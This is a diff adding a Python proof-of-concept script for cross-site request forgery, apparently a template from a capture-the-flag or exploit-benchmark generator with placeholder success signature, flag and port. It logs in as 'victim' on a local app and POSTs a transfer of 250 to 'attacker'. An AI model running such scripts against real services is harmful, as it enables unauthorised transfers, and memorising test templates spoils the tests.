@@ -1,0 +1,42 @@
+import argparse
+import http.cookiejar
+import json
+import sys
+from urllib.error import HTTPError, URLError
+from urllib.parse import urlencode
+from urllib.request import HTTPCookieProcessor, Request, build_opener
+
+# Asset-backed family-aware fallback template for CSRF.
+SUCCESS_SIGNATURE = __SUCCESS_SIGNATURE__
+FLAG_TOKEN = __FLAG_TOKEN__
+
+def exploit(base_url: str) -> bool:
+    cookie_jar = http.cookiejar.CookieJar()
+    opener = build_opener(HTTPCookieProcessor(cookie_jar))
+    try:
+        with opener.open(base_url.rstrip('/') + '/login?user=victim', timeout=5) as resp:
+            resp.read()
+        body = urlencode({'recipient': 'attacker', 'amount': '250'}).encode('utf-8')
+        req = Request(base_url.rstrip('/') + '/transfer', data=body, method='POST')
+        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
+        with opener.open(req, timeout=5) as resp:
+            payload = json.loads(resp.read().decode('utf-8', errors='ignore'))
+    except (HTTPError, URLError, json.JSONDecodeError) as exc:
+        print(f'[csrf-fallback] request failed: {exc}', file=sys.stderr)
+        return False
+    return payload.get('ok') is True and str(payload.get('recipient')) == 'attacker' and str(payload.get('amount')) == '250'
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description='CSRF fallback PoC')
+    parser.add_argument('--base-url', default='http://127.0.0.1:__PORT__')
+    args = parser.parse_args()
+    if exploit(args.base_url):
+        print(SUCCESS_SIGNATURE)
+        if FLAG_TOKEN:
+            print(FLAG_TOKEN)
+        raise SystemExit(0)
+    print('[csrf-fallback] exploit did not succeed', file=sys.stderr)
+    raise SystemExit(1)
+
+if __name__ == '__main__':
+    main()
